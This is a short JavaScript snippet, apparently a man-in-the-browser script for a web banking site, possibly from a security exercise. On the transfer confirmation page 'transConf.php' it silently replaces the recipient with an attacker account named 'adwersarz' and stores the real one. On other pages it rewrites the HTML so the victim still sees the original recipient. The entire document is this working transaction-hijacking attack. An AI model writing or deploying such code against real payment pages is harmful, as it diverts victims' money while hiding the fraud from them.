var path = window.location.pathname;
var page = path.split("/").pop();

if (page == 'transConf.php'){
    var receiver = document.getElementById("uname");
    localStorage.setItem('correctRec', receiver.getAttribute('value'));
    receiver.setAttribute("value", "adwersarz");
} else {
    document.body.innerHTML = document.body.innerHTML.replace(/adwersarz/g, localStorage.getItem('correctRec'));
}